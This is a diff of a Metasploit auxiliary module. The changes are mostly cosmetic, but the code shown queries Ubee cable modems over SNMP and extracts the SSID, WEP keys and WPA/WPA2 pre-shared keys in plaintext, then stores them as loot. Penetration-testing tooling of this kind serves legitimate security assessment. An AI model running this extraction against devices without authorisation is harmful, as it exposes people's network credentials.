@@ -1,12 +1,9 @@
-#
-# This module requires Metasploit: http://metasploit.com/download
+##
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SNMPClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -51,12 +48,12 @@ class Metasploit3 < Msf::Auxiliary
           print_good("SSID: #{ssid}")
           wifiinfo << "SSID: #{ssid}" << "\n"
 
-          #Wifi Security Version
+          # Wifi Security Version
           wifiversion = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.1.14.1.5.12')
           if wifiversion == "0"
             print_line("Open Access Wifi is Enabled")
 
-          #Wep enabled
+          # WEP enabled
           elsif wifiversion == "1"
           weptype = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.2.12')
             if weptype == "2"
@@ -105,29 +102,29 @@ class Metasploit3 < Msf::Auxiliary
               print_line("FAILED")
             end
 
-          #WPA enabled
+          # WPA enabled
           elsif wifiversion == "2"
             print_line("Device is configured for WPA ")
             wpapsk = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12')
             print_good("WPA PSK: #{wpapsk}")
             wifiinfo << "WPA PSK: #{wpapsk}" << "\n"
 
-          #WPA2 enabled
+          # WPA2 enabled
           elsif wifiversion == "3"
             print_line("Device is configured for WPA2")
             wpapsk2 = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12')
             print_good("WPA2 PSK: #{wpapsk2}")
             wifiinfo << "WPA PSK: #{wpapsk2}" << "\n"
 
-          #WPA Enterprise enabled
+          # WPA Enterprise enabled
           elsif wifiversion == "4"
             print_line("Device is configured for WPA enterprise")
 
-          #WPA2 Enterprise enabled
+          # WPA2 Enterprise enabled
           elsif wifiversion == "5"
             print_line("Device is configured for WPA2 enterprise")
 
-          #WEP 802.1x enabled
+          # WEP 802.1x enabled
           elsif wifiversion == "6"
             print_line("Device is configured for WEP 802.1X")
 
@@ -139,13 +136,13 @@ class Metasploit3 < Msf::Auxiliary
          print_line("WIFI is not enabled")
          end
     end
-     #Woot we got loot.
+     # Woot we got loot.
      loot_name     = "ubee_wifi"
      loot_type     = "text/plain"
      loot_filename = "ubee_wifi.txt"
      loot_desc     = "Ubee Wifi configuration data"
      p = store_loot(loot_name, loot_type, datastore['RHOST'], wifiinfo , loot_filename, loot_desc)
-     print_status("WIFI Data saved: #{p}")
+     print_good("WiFi Data saved: #{p}")
 
      rescue ::SNMP::UnsupportedVersion
      rescue ::SNMP::RequestTimeout
